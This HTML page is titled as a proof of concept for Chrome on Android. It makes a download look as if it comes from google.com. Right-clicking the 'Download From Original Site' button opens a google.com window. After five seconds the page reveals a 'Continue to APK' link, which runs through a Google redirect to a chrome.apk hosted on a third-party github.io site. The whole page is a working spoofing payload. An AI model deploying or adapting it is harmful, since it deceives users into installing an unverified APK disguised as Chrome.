
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chrome Android Intent and Download PoC</title>

  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 4px;
    }

    #downloadArea {
      display: none;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<center>
  <a href="https://google.com"
     id="intentLink"
     class="button">
    Download From Original Site
  </a>

  <div id="downloadArea">
    <p>APK destination is ready.</p>
    <a
      class="button"
      href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"
      target="_blank"
      rel="noopener">
      Continue to APK
    </a>
  </div>
</center>

<script>
const link = document.getElementById("intentLink");
let triggered = false;

link.addEventListener("contextmenu", () => {
  if (triggered) return;
  triggered = true;

  const newWindow = window.open("https://google.com", "x");

  setTimeout(() => {
    document.getElementById("downloadArea").style.display = "block";
    triggered = false;
  }, 5000);
});
</script>

</body>
</html>
